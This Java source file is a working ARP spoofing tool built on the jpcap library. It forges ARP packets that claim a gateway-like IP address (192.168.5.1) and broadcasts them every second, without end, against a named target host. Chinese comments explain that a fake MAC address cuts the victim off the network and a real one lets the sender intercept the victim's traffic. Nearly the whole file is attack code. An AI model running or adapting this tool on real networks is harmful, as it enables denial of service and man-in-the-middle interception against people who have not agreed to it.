package pcap;

import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import method.MACConvert;

public class ARP {

	public static byte[] stomac(String s) {
		byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
		String[] s1 = s.split("-");
		for (int x = 0; x < s1.length; x++) {
			mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
		}
		return mac;
	}
  
	public static void main(String[] args) throws Exception {
		InetAddress desip = InetAddress.getByName("192.168.5.8");// 被欺骗的目标IP地址
		byte[] desmac = stomac("40-b8-9a-09-82-ff");// 被欺骗的目标目标MAC数组
		InetAddress srcip = InetAddress.getByName("192.168.5.1");// 假的源IP地址
		byte[] srcmac = stomac("11-22-33-44-55-66"); // 网络层假的MAC数组会导致不能上网 真的MAC地址可以截获流量 网络层地址可以任意填写 但数据链路层必须为正确MAC地址
														// 否则对方收不到
		// 枚举网卡并打开设备
		// 枚举网卡设备
		NetworkInterface[] devices = JpcapCaptor.getDeviceList(); // 选择网卡设备
		JpcapSender sender = JpcapSender.openDevice(devices[2]); // 打开网卡设备
		String localMAC = MACConvert.macToS(devices[2].mac_address);
		System.out.println(localMAC);
		byte[] mac = MACConvert.sToMAC("74-e5-0b-3a-72-55");

		ARPPacket arp = new ARPPacket();// 设置ARP包

		arp.hardtype = ARPPacket.HARDTYPE_ETHER; // 硬件类型
		arp.prototype = ARPPacket.PROTOTYPE_IP; // 协议类型
		arp.operation = ARPPacket.ARP_REQUEST; // 操作类型 REPLY 表示类型为应答
		arp.hlen = 6; // 硬件地址长度
		arp.plen = 4; // 协议类型长度

		arp.sender_hardaddr = srcmac; // 发送端MAC地址
		arp.sender_protoaddr = srcip.getAddress(); // 发送端IP地址
		arp.target_hardaddr = stomac("00-00-00-10-00-01"); // 目标硬件地址
		arp.target_protoaddr = desip.getAddress(); // 目标IP地址

		EthernetPacket ether = new EthernetPacket(); // 定义以太网首部
		ether.frametype = EthernetPacket.ETHERTYPE_ARP; // 设置帧的类型为ARP帧
		ether.src_mac = devices[2].mac_address; // 源MAC地址
		ether.dst_mac = MACConvert.LinkLayerBroadcastMACBytes; // 目标MAC地址
		arp.datalink = ether; // 添加

		// 发送ARP应答包
		while (true) {
			System.out.println("sending arp..");
			sender.sendPacket(arp);
			Thread.sleep(1000);
		}
	}

}
